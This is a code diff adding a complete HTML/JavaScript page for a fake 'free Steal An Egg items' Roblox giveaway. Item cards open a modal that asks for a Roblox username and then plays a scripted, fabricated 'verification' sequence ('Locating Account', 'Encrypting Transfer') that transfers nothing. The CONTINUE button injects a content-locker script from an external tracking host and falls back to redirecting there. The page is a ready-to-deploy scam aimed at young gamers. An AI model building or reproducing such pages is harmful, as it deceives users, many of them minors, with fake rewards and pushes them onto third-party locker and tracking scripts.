+            <div class="item-img"><img src="https://i.postimg.cc/FR24S6yn/Ember-Adult.webp" alt="Ember dragon"></div>
+            <div class="item-details">
+              <span class="item-name">Ember Dragon</span>
+              <span class="item-stock">x1 in Stock</span>
+              <span class="rarity-tag" style="background:linear-gradient(90deg, #ff4500, #ff8c00);">MYTHIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Ember Dragon', 'https://i.postimg.cc/FR24S6yn/Ember-Adult.webp')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/fR0YjShZ/1000027622-removebg-preview.png" alt="Ice dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Ice Dragon Egg</span>
+              <span class="item-stock">x5 in Stock</span>
+              <span class="rarity-tag">EPIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Ice Dragon Egg', 'https://i.postimg.cc/fR0YjShZ/1000027622-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/15TfHsQv/1000028063-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Mammoth Egg</span>
+              <span class="item-stock">x2 in Stock</span>
+              <span class="rarity-tag">LEGENDARY</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Mammoth Egg', 'https://i.postimg.cc/15TfHsQv/1000028063-removebg-preview.png')">CLAIM!</button>
+        </div>
+         
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/BnKk8cN0/1000028078-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">king Mammoth</span>
+              <span class="item-stock">x5 in Stock</span>
+              <span class="rarity-tag">COSMIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('king Mammoth', 'https://i.postimg.cc/BnKk8cN0/1000028078-removebg-preview.png')">CLAIM!</button>
+        </div>
+      
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/MKJL7CF0/1000028130-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Oni tiger</span>
+              <span class="item-stock">x2 in Stock</span>
+              <span class="rarity-tag">COSMIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Oni tiger', 'https://i.postimg.cc/MKJL7CF0/1000028130-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/Wzv7Zv10/1000028128-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Oni tiger Egg</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">COSMIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Oni tiger Egg', 'https://i.postimg.cc/Wzv7Zv10/1000028128-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/vZbHXBKx/Mortuus-Egg.webp" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Phoenix Egg</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">COSMIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Phoenix Egg', 'https://i.postimg.cc/vZbHXBKx/Mortuus-Egg.webp')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/9XsvcntF/1000028083-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Cerberus Egg</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Cerberus Egg', 'https://i.postimg.cc/9XsvcntF/1000028083-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/FzwGm8MF/1000028080-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Cerberus</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Cerberus', 'https://i.postimg.cc/FzwGm8MF/1000028080-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/y82Kt8QL/1000028075-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Gorilla Egg</span>
+              <span class="item-stock">x7 in Stock</span>
+              <span class="rarity-tag">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Gorilla Egg', 'https://i.postimg.cc/y82Kt8QL/1000028075-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/3wPwXBQg/1000028072-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Sand Spider Egg</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">MYTHIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Sand Spider Egg', 'https://i.postimg.cc/3wPwXBQg/1000028072-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+           <div class="item-img"><img src="https://i.postimg.cc/7h4YcZ6b/1000028067-removebg-preview.png" alt="Dragon egg"></div>
+            <div class="item-details">
+              <span class="item-name">Sand Spider</span>
+              <span class="item-stock">x3 in Stock</span>
+              <span class="rarity-tag">MYTHIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Sand Spider', 'https://i.postimg.cc/7h4YcZ6b/1000028067-removebg-preview.png')">CLAIM!</button>
+        </div>
+        
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/gJLFBSqb/1000036332-removebg-preview.png" alt="Devine trail"></div>
+            <div class="item-details">
+              <span class="item-name">Moonbloom Trail</span>
+              <span class="item-stock">x6 in Stock</span>
+              <span class="rarity-tag">RARE</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Moonbloom Trail', 'https://i.postimg.cc/gJLFBSqb/1000036332-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/FF78cmH6/1000027474-removebg-preview.png" alt="Secret trail"></div>
+            <div class="item-details">
+              <span class="item-name">Secret Trail</span>
+              <span class="item-stock">x2 in Stock</span>
+              <span class="rarity-tag" style="background:linear-gradient(90deg, #9333ea, #c084fc);">SECRET</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Secret Trail', 'https://i.postimg.cc/FF78cmH6/1000027474-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/y6gpxPLL/1000027544-removebg-preview.png" alt="Eternal trail"></div>
+            <div class="item-details">
+              <span class="item-name">Eternal Trail</span>
+              <span class="item-stock">x4 in Stock</span>
+              <span class="rarity-tag">EPIC</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Eternal Trail', 'https://i.postimg.cc/y6gpxPLL/1000027544-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card active-tab" data-category="items">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/8CztSBFq/1000027545-removebg-preview.png" alt="Devine trail"></div>
+            <div class="item-details">
+              <span class="item-name">Devine Trail</span>
+              <span class="item-stock">x6 in Stock</span>
+              <span class="rarity-tag">RARE</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('Devine Trail', 'https://i.postimg.cc/8CztSBFq/1000027545-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <!-- ==================== قسم الـ BOOSTS ==================== -->
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/vTbdXVKN/1000027565-removebg-preview.png" alt="X2 growth"></div>
+            <div class="item-details">
+              <span class="item-name">X2 Growth</span>
+              <span class="item-stock">Boost Active</span>
+              <span class="rarity-tag">BOOST</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('X2 Growth', 'https://i.postimg.cc/vTbdXVKN/1000027565-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/sDbTrrjy/1000027562-removebg-preview.png" alt="X2 money"></div>
+            <div class="item-details">
+              <span class="item-name">X2 Money</span>
+              <span class="item-stock">Boost Active</span>
+              <span class="rarity-tag">BOOST</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('X2 Money', 'https://i.postimg.cc/sDbTrrjy/1000027562-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/jdnhvFH0/1000027559-removebg-preview.png" alt="+500M speed"></div>
+            <div class="item-details">
+              <span class="item-name">+500M Speed</span>
+              <span class="item-stock">Instant Reward</span>
+              <span class="rarity-tag">SPEED</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('+500M Speed', 'https://i.postimg.cc/jdnhvFH0/1000027559-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/pT1DJfrC/1000027557-removebg-preview.png" alt="+1B speed"></div>
+            <div class="item-details">
+              <span class="item-name">+1B Speed</span>
+              <span class="item-stock">Instant Reward</span>
+              <span class="rarity-tag">SPEED</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('+1B Speed', 'https://i.postimg.cc/pT1DJfrC/1000027557-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/T3qg4Mh5/1000027551-removebg-preview.png" alt="4$"></div>
+            <div class="item-details">
+              <span class="item-name">$4 Cash Drop</span>
+              <span class="item-stock">Limited</span>
+              <span class="rarity-tag" style="background:linear-gradient(90deg, #10b981, #34d399);">CASH</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('$4 Cash Drop', 'https://i.postimg.cc/T3qg4Mh5/1000027551-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+        <div class="item-card" data-category="boosts">
+          <div class="item-left">
+            <div class="item-img"><img src="https://i.postimg.cc/xCqm8X5Z/1000027549-removebg-preview.png" alt="8$"></div>
+            <div class="item-details">
+              <span class="item-name">$8 Cash Drop</span>
+              <span class="item-stock">Limited</span>
+              <span class="rarity-tag" style="background:linear-gradient(90deg, #10b981, #34d399);">CASH</span>
+            </div>
+          </div>
+          <button class="claim-btn" onclick="openModal('$8 Cash Drop', 'https://i.postimg.cc/xCqm8X5Z/1000027549-removebg-preview.png')">CLAIM!</button>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+  <!-- الواجهة المنبثقة (Modal) -->
+  <div class="modal-overlay" id="claimModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <span id="modalHeaderTitle">Steal An EGG Free Drop</span>
+        <button class="modal-close" onclick="closeModal()">×</button>
+      </div>
+      
+      <div class="modal-body">
+        
+        <!-- الخطوة 1: إدخال اسم المستخدم -->
+        <div id="stepUserForm" style="width: 100%; display: flex; flex-direction: column; gap: 16px; align-items: center;">
+          <div class="modal-item-preview">
+            <div class="modal-item-img">
+              <img id="modalItemImg" src="" alt="Item">
+            </div>
+            <div class="modal-item-details">
+              <span class="modal-item-name" id="modalItemName">Item Name</span>
+              <span class="modal-free-tag" id="modalFreeTag">FREE DROP</span>
+            </div>
+          </div>
+          
+          <p class="modal-instruction" id="modalInstruction">
+            Enter your Roblox username to start generating your free item.
+          </p>
+
+          <div class="modal-input-group">
+            <span>👤</span>
+            <input type="text" class="modal-input" id="robloxUser" placeholder="Your Roblox username">
+          </div>
+
+          <button class="modal-submit-btn" id="modalSubmitBtn" onclick="startVerification()">CLAIM NOW</button>
+
+          <div class="modal-security">
+            <span class="secure-dot"></span>
+            <span id="modalSecText">Secure connection • No password required</span>
+          </div>
+        </div>
+
+        <!-- الخطوة 2: شاشة التحقق والخطوات التدريجية -->
+        <div class="verification-wrapper" id="verificationWrapper">
+          <div class="scanner-circle">
+            <div class="scanner-line"></div>
+            <div class="scanner-icon-inner">👤</div>
+          </div>
+          
+          <div class="encrypting-title" id="scannerStatusText">ENCRYPTING TRANSFER...</div>
+
+          <div class="steps-list">
+            <div class="step-box" id="vStep1">
+              <div class="step-icon-badge" id="b1">1</div>
+              <div class="step-text-content">
+                <span class="step-name">Locating Account</span>
+                <span class="step-desc" id="desc1">Waiting...</span>
+              </div>
+            </div>
+
+            <div class="step-box" id="vStep2">
+              <div class="step-icon-badge" id="b2">2</div>
+              <div class="step-text-content">
+                <span class="step-name">Generating Item</span>
+                <span class="step-desc" id="desc2">Waiting...</span>
+              </div>
+            </div>
+
+            <div class="step-box" id="vStep3">
+              <div class="step-icon-badge" id="b3">3</div>
+              <div class="step-text-content">
+                <span class="step-name">Encrypting Transfer</span>
+                <span class="step-desc" id="desc3">Waiting...</span>
+              </div>
+            </div>
+
+            <div class="step-box" id="vStep4">
+              <div class="step-icon-badge" id="b4">4</div>
+              <div class="step-text-content">
+                <span class="step-name">Ready To Deliver</span>
+                <span class="step-desc" id="desc4">Waiting for verification...</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="modal-progress-track">
+            <div class="modal-progress-fill" id="modalProgressFill"></div>
+          </div>
+
+          <!-- زر CONTINUE لتشغيل الكونتنت لوكر عند الضغط عليه -->
+          <button class="continue-btn" id="continueBtn" onclick="triggerContentLocker()">CONTINUE</button>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let currentItemName = "";
+
+    function toggleTheme() {
+      document.body.classList.toggle('light-mode');
+      const btn = document.getElementById('themeBtn');
+      btn.textContent = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
+    }
+
+    function openModal(itemName, itemImgUrl) {
+      currentItemName = itemName;
+      document.getElementById('modalItemName').innerText = itemName;
+      document.getElementById('modalItemImg').src = itemImgUrl;
+      
+      document.getElementById('stepUserForm').style.display = 'flex';
+      document.getElementById('verificationWrapper').style.display = 'none';
+      document.getElementById('continueBtn').style.display = 'none';
+      document.getElementById('robloxUser').value = '';
+      
+      document.getElementById('claimModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('claimModal').style.display = 'none';
+    }
+
+    function startVerification() {
+      const username = document.getElementById('robloxUser').value.trim();
+      if(username === "") {
+        alert("Please enter your Roblox username!");
+        return;
+      }
+
+      document.getElementById('stepUserForm').style.display = 'none';
+      document.getElementById('verificationWrapper').style.display = 'flex';
+      document.getElementById('continueBtn').style.display = 'none';
+
+      resetSteps();
+
+      const progressFill = document.getElementById('modalProgressFill');
+      const statusText = document.getElementById('scannerStatusText');
+
+      setTimeout(() => {
+        setStepCompleted('vStep1', 'b1', 'desc1', 'Found: ' + username);
+        setStepActive('vStep2', 'b2');
+        progressFill.style.width = '25%';
+        statusText.innerText = "GENERATING ITEM...";
+      }, 1200);
+
+      setTimeout(() => {
+        setStepCompleted('vStep2', 'b2', 'desc2', 'Item prepared: ' + currentItemName);
+        setStepActive('vStep3', 'b3');
+        progressFill.style.width = '50%';
+        statusText.innerText = "ENCRYPTING TRANSFER...";
+      }, 2600);
+
+      setTimeout(() => {
+        setStepCompleted('vStep3', 'b3', 'desc3', 'Securing your reward...');
+        setStepActive('vStep4', 'b4');
+        progressFill.style.width = '75%';
+        statusText.innerText = "READY TO DELIVER...";
+      }, 4000);
+
+      setTimeout(() => {
+        setStepCompleted('vStep4', 'b4', 'desc4', 'Verification complete!');
+        progressFill.style.width = '100%';
+        statusText.innerText = "VERIFICATION COMPLETE!";
+        
+        // إظهار زر CONTINUE عند انتهاء التحقق
+        document.getElementById('continueBtn').style.display = 'block';
+      }, 5500);
+    }
+
+    // دالة تحميل وتشغيل الكونتنت لوكر عند الضغط على زر Continue الأخضر
+    function triggerContentLocker() {
+      // إزالة السكريبت القديم إن وجد لمنع التكرار
+      const oldScript = document.getElementById('ogjs');
+      if (oldScript) {
+        oldScript.remove();
+      }
+
+      // حقن سكريبت الكونتنت لوكر الخاص بك ديناميكياً
+      const script = document.createElement('script');
+      script.type = 'text/javascript';
+      script.id = 'ogjs';
+      script.src = 'https://apptrck.net/cl/i/42lgmj';
+      
+      script.onerror = function() {
+        // توجيه احتياطي للرابط المباشر في حال واجه المتصفح مشكلة في الحقن
+        window.location.href = "https://apptrck.net/cl/i/42lgmj";
+      };
+
+      document.body.appendChild(script);
+    }
+
+    function resetSteps() {
+      const steps = ['vStep1', 'vStep2', 'vStep3', 'vStep4'];
+      const badges = ['b1', 'b2', 'b3', 'b4'];
+      const descs = ['desc1', 'desc2', 'desc3', 'desc4'];
+      
+      steps.forEach((s, idx) => {
+        const el = document.getElementById(s);
+        el.className = 'step-box';
+        document.getElementById(badges[idx]).innerText = (idx + 1);
+        document.getElementById(descs[idx]).innerText = idx === 3 ? "Waiting for verification..." : "Waiting...";
+      });
+
+      setStepActive('vStep1', 'b1');
+      document.getElementById('modalProgressFill').style.width = '5%';
+      document.getElementById('scannerStatusText').innerText = "LOCATING ACCOUNT...";
+    }
+
+    function setStepActive(stepId, badgeId) {
+      const el = document.getElementById(stepId);
+      el.classList.add('active-step');
+    }
+
+    function setStepCompleted(stepId, badgeId, descId, descText) {
+      const el = document.getElementById(stepId);
+      el.classList.remove('active-step');
+      el.classList.add('completed');
+      document.getElementById(badgeId).innerText = "✓";
+      document.getElementById(descId).innerText = descText;
+    }
+
+    window.onclick = function(event) {
+      const modal = document.getElementById('claimModal');
+      if (event.target === modal) {
+        closeModal();
+      }
+    }
+
+    const translations = {
+      en: {
+        title: "GET YOUR FREE STEAL AN EGG ITEMS",
+        subtitle: "For Roblox players. Tap claim and unlock your unique drop.",
+        badge: "PLAYERS CLAIMING RIGHT NOW",
+        storeTitle: "🍬 STORE",
+        itemsTab: "ITEMS",
+        boostsTab: "BOOSTS",
+        claim: "CLAIM!",
+        modalTitle: "Steal An EGG Free Drop",
+        freeTag: "FREE DROP",
+        instruction: "Enter your Roblox username to start generating your free item.",
+        placeholder: "Your Roblox username",
+        submitBtn: "CLAIM NOW",
+        secText: "Secure connection • No password required"
+      },
+      fr: {
+        title: "OBTENEZ VOS OBJETS STEAL AN EGG GRATUITS",
+        subtitle: "Pour les joueurs Roblox. Appuyez sur réclamer et débloquez votre récompense.",
+        badge: "JOUEURS QUI RÉCLAMENT EN CE MOMENT",
+        storeTitle: "🍬 BOUTIQUE",
+        itemsTab: "OBJETS",
+        boostsTab: "BOOSTS",
+        claim: "RÉCLAMER!",
+        modalTitle: "Steal An EGG Drop Gratuit",
+        freeTag: "OBJET GRATUIT",
+        instruction: "Entrez votre nom d'utilisateur Roblox pour générer votre objet.",
+        placeholder: "Votre pseudo Roblox",
+        submitBtn: "RÉCLAMER MAINTENANT",
+        secText: "Connexion sécurisée • Aucun mot de passe requis"
+      },
+      es: {
+        title: "OBTÉN TUS OBJETOS GRATIS DE STEAL AN EGG",
+        subtitle: "Para jugadores de Roblox. Toca reclamar y desbloquea tu recompensa.",
+        badge: "JUGADORES RECLAMANDO AHORA MISMO",
+        storeTitle: "🍬 TIENDA",
+        itemsTab: "OBJETOS",
+        boostsTab: "MEJORAS",
+        claim: "¡RECLAMAR!",
+        modalTitle: "Drop Gratis Steal An EGG",
+        freeTag: "DROP GRATIS",
+        instruction: "Ingresa tu nombre de usuario de Roblox para generar tu objeto.",
+        placeholder: "Tu usuario de Roblox",
+        submitBtn: "RECLAMAR AHORA",
+        secText: "Conexión segura • Sin contraseña requerida"
+      },
+      tl: {
+        title: "KUMUHA NG LIBRENG STEAL AN EGG ITEMS",
+        subtitle: "Para sa mga manlalaro ng Roblox. Pindutin ang claim para makuha ang drop.",
+        badge: "MGA MANLALARO NA NAG-C-CLAIM NGAYON",
+        storeTitle: "🍬 TINDHAN",
+        itemsTab: "ITEMS",
+        boostsTab: "BOOSTS",
+        claim: "CLAIM!",
+        modalTitle: "Steal An EGG Libreng Drop",
+        freeTag: "LIBRENG DROP",
+        instruction: "Ilagay ang iyong Roblox username para makuha ang item.",
+        placeholder: "Ang iyong Roblox username",
+        submitBtn: "CLAIM NA",
+        secText: "Ligtas na koneksyon • Walang password na kailangan"
+      }
+    };
+
+    function changeLanguage() {
+      const selectedLang = document.getElementById('langSelect').value;
+      const t = translations[selectedLang];
+
+      document.getElementById('hero-title').innerText = t.title;
+      document.getElementById('hero-subtitle').innerText = t.subtitle;
+      document.getElementById('badge-text').innerText = t.badge;
+      document.getElementById('store-title').innerText = t.storeTitle;
+      document.getElementById('tab-items').innerText = t.itemsTab;
+      document.getElementById('tab-boosts').innerText = t.boostsTab;
+      
+      document.getElementById('modalHeaderTitle').innerText = t.modalTitle;
+      document.getElementById('modalFreeTag').innerText = t.freeTag;
+      document.getElementById('modalInstruction').innerText = t.instruction;
+      document.getElementById('robloxUser').placeholder = t.placeholder;
+      document.getElementById('modalSubmitBtn').innerText = t.submitBtn;
+      document.getElementById('modalSecText').innerText = t.secText;
+
+      document.querySelectorAll('.claim-btn').forEach(btn => {
+        btn.innerText = t.claim;
+      });
+    }
+
+    function switchTab(tab) {
+      document.getElementById('tab-items').classList.toggle('active', tab === 'items');
+      document.getElementById('tab-boosts').classList.toggle('active', tab === 'boosts');
+
+      document.querySelectorAll('.item-card').forEach(card => {
+        if (card.getAttribute('data-category') === tab) {
+          card.classList.add('active-tab');
+        } else {
+          card.classList.remove('active-tab');
+        }
+      });
+    }
+  </script>
+</body>
+</html>
